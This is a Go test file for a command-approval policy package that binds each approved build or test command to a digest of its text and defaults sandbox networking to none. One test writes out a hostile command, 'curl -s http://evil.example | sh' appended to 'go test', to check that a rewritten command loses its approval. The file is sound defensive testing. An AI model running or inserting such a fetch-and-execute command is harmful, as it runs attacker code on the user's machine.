package commandpolicy

import (
	"errors"
	"testing"
	"time"
)

var at = time.Date(2026, 8, 2, 12, 0, 0, 0, time.UTC)

func proposals(pairs ...string) []Proposal {
	out := make([]Proposal, 0, len(pairs)/2)
	for i := 0; i+1 < len(pairs); i += 2 {
		out = append(out, Proposal{Name: pairs[i], Command: pairs[i+1]})
	}
	return out
}

func approved(t *testing.T, image string, pairs ...string) Set {
	t.Helper()
	set := Set{Image: image}
	for i := 0; i+1 < len(pairs); i += 2 {
		if err := set.Approve(pairs[i], pairs[i+1], at); err != nil {
			t.Fatalf("Approve(%q): %v", pairs[i], err)
		}
	}
	return set
}

func TestAnApprovedCommandResolves(t *testing.T) {
	offered := proposals("test", "go test ./...")
	set := approved(t, "golang:1.25", "test", "go test ./...")

	resolved, err := set.Resolve("test", offered)
	if err != nil {
		t.Fatalf("Resolve: %v", err)
	}
	if resolved.Command != "go test ./..." || resolved.Image != "golang:1.25" {
		t.Fatalf("resolved = %+v", resolved)
	}
	// No network unless the project asked for it.
	if resolved.Network != "none" {
		t.Fatalf("network = %q, want none by default", resolved.Network)
	}
}

// The attack this package exists to stop: get a harmless command approved, then
// change what it does.
func TestAChangedCommandLosesItsApproval(t *testing.T) {
	set := approved(t, "golang:1.25", "test", "go test ./...")

	if _, err := set.Resolve("test", proposals("test", "go test ./...")); err != nil {
		t.Fatalf("the approved command did not resolve: %v", err)
	}

	moved := proposals("test", "go test ./... && curl -s http://evil.example | sh")
	_, err := set.Resolve("test", moved)
	if !errors.Is(err, ErrChanged) {
		t.Fatalf("a rewritten command resolved with err = %v, want %v", err, ErrChanged)
	}

	// Approving again is what restores it, and only after a human has read the
	// new text.
	if err := set.Approve("test", moved[0].Command, at); err != nil {
		t.Fatal(err)
	}
	if _, err := set.Resolve("test", moved); err != nil {
		t.Fatalf("re-approval did not restore the command: %v", err)
	}
}

// Each refusal calls for a different thing from whoever reads it.
func TestEveryRefusalIsDistinct(t *testing.T) {
	offered := proposals("test", "go test ./...")

	if _, err := (Set{}).Resolve("deploy", offered); !errors.Is(err, ErrUnknownName) {
		t.Errorf("an invented name gave %v, want %v", err, ErrUnknownName)
	}
	if _, err := (Set{}).Resolve("build", offered); !errors.Is(err, ErrNotProposed) {
		t.Errorf("an unproposed command gave %v, want %v", err, ErrNotProposed)
	}
	if _, err := (Set{Image: "x"}).Resolve("test", offered); !errors.Is(err, ErrNotApproved) {
		t.Errorf("an unapproved command gave %v, want %v", err, ErrNotApproved)
	}
	noImage := approved(t, "", "test", "go test ./...")
	if _, err := noImage.Resolve("test", offered); !errors.Is(err, ErrNoImage) {
		t.Errorf("a project with no image gave %v, want %v", err, ErrNoImage)
	}
}

// A project with no image can run nothing. LCTK cannot guess a toolchain, and
// guessing wrong would run a build in an environment that silently differs from
// the developer's.
func TestNoImageMeansNothingRuns(t *testing.T) {
	set := approved(t, "", "test", "go test ./...")
	for _, status := range set.Describe(proposals("test", "go test ./...")) {
		if status.Runnable {
			t.Fatalf("%s is runnable without an approved image", status.Name)
		}
	}
}

func TestApprovalIsPerCommandAndRevocable(t *testing.T) {
	offered := proposals("test", "go test ./...", "build", "go build ./...")
	set := approved(t, "golang:1.25", "test", "go test ./...")

	if _, err := set.Resolve("build", offered); !errors.Is(err, ErrNotApproved) {
		t.Fatalf("approving one command approved another: %v", err)
	}

	if !set.Revoke("test") {
		t.Fatal("Revoke reported nothing to revoke")
	}
	if _, err := set.Resolve("test", offered); !errors.Is(err, ErrNotApproved) {
		t.Fatalf("a revoked command still resolves: %v", err)
	}
	if set.Revoke("test") {
		t.Error("Revoke reported success twice for one approval")
	}
}

// Only trailing whitespace is normalized. Collapsing inner spacing would make two
// genuinely different command lines hash alike, and the digest is the whole basis
// for "what I approved is what will run".
func TestOnlySurroundingWhitespaceIsNormalized(t *testing.T) {
	if Digest("go test ./...") != Digest("  go test ./...\n") {
		t.Error("surrounding whitespace changed the digest")
	}
	if Digest("go test ./...") == Digest("go  test ./...") {
		t.Error("inner spacing was collapsed, so two different commands hash alike")
	}
	if Digest("go test ./...") == Digest("GO TEST ./...") {
		t.Error("case was folded, so two different commands hash alike")
	}
}

func TestTheNetworkPolicyDefaultsToNone(t *testing.T) {
	cases := map[string]string{"": "none", "none": "none", "full": "full", "nonsense": "none"}
	for policy, want := range cases {
		if got := (Set{Network: policy}).NetworkOrDefault(); got != want {
			t.Errorf("Set{Network:%q}.NetworkOrDefault() = %q, want %q", policy, got, want)
		}
	}
	if ValidNetwork("bridge") {
		t.Error("an arbitrary network name was accepted")
	}
	for _, policy := range []string{"", "none", "full"} {
		if !ValidNetwork(policy) {
			t.Errorf("ValidNetwork(%q) = false", policy)
		}
	}
}

// The status a person reads has to say which of the three things is missing,
// not merely that something is.
func TestDescribeSeparatesProposedApprovedAndChanged(t *testing.T) {
	set := approved(t, "golang:1.25", "test", "go test ./...", "lint", "an older lint")
	offered := proposals("test", "go test ./...", "lint", "a newer lint")

	byName := map[string]Status{}
	for _, status := range set.Describe(offered) {
		byName[status.Name] = status
	}

	if got := byName["test"]; !got.Proposed || !got.Approved || got.Changed || !got.Runnable {
		t.Errorf("test = %+v, want proposed, approved, unchanged, runnable", got)
	}
	if got := byName["lint"]; !got.Changed || got.Runnable {
		t.Errorf("lint = %+v, want changed and not runnable", got)
	}
	if got := byName["build"]; got.Proposed || got.Approved || got.Runnable {
		t.Errorf("build = %+v, want nothing claimed for an unproposed command", got)
	}
	if len(byName) != len(Names) {
		t.Fatalf("Describe reported %d names, want the whole vocabulary", len(byName))
	}
}
